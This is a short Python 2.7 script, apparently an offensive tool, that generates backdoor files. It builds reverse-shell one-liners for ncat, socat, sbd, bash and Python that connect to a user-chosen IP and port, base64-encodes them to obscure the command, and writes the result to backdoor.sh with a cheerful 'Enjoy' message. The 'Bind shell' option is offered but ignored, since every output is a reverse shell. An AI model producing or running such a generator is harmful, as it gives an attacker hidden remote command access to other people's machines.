#!/usr/bin/env python2.7

import sys, os, base64

def select_type():
    print ("Select type")
    print ("1 - Reverse shell")
    print ("2 - Bind shell")
    return input("Choose an option: >> ")

def select_language():
    print ("Select language for the payload")
    print ("1 - Netcat")
    print ("2 - Netcat (SSL)")
    print ("3 - Socat")
    print ("4 - SBD (SSL)")
    print ("5 - Bash")
    print ("6 - Python")

    return input("Choose an option: >> ")


def select_ip():
    print ("IP to redirect the shell")
    return raw_input ("Type the IP address: ")

def select_port():
    print ("PORT to redirect the shell")
    return input ("Type the PORT: ")

def generate_backdoor(type, IP, PORT, language):
    ncat_backdoor = "ncat -nv " + str(IP) + " " + str(PORT) + " -e /bin/bash 2>/dev/null &"
    sncat_backdoor = "ncat -nv " + str(IP) + " " + str(PORT) + " -e /bin/bash --ssl 2>/dev/null &"
    socat_backdoor = "socat tcp-connect:" + str(IP) + ":" + str(PORT) + " exec:/bin/sh,pty,stderr,setsid,sigint,sane 2>/dev/null &"
    sbd_backdoor = "sbd " + str(IP) + " " + str(PORT) + " -e /bin/bash 2>/dev/null &"
    bash_backdoor = "bash -i >& /dev/tcp/"+ str(IP) +"/" + str(PORT) + " 0>&1 &"
    python_backdoor = """python -c \"import socket,subprocess;s = socket.socket(socket.AF_INET, socket.SOCK_STREAM);s.connect(('"""+str(IP)+"""', """+str(PORT)+"""));
while True:data = s.recv(1024);proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE);stdout_value = proc.stdout.read() + proc.stderr.read();s.send(stdout_value)\" 2>/dev/null &"""
    if language == 1:
        backdoor = ncat_backdoor
    elif language == 2:
        backdoor = sncat_backdoor
    elif language == 3:
        backdoor = socat_backdoor
    elif language == 4:
        backdoor =  sbd_backdoor
    elif language == 5:
        backdoor = bash_backdoor
    elif language == 6:
        backdoor = python_backdoor
    else:
        print("Wrong input >>> Exit ")
        return

    backdoor_b = backdoor.encode('ascii')
    encoded_backdoor = base64.b64encode(backdoor_b)
    encoded_backdoor = encoded_backdoor.decode('ascii')
    if language == 5:
        encoded_backdoor = "echo " + encoded_backdoor + "| base64 --decode | /bin/bash"
    else:
        encoded_backdoor = "echo " + encoded_backdoor + "| base64 --decode | sh"
    with open('backdoor.sh', 'w') as f:
        f.write(encoded_backdoor)
        f.close()
    print ("Backdoor generated successfully. Enjoy ^.^")


type = select_type()
language = select_language()
ip = select_ip()
port = select_port()
generate_backdoor(type, ip, port, language)
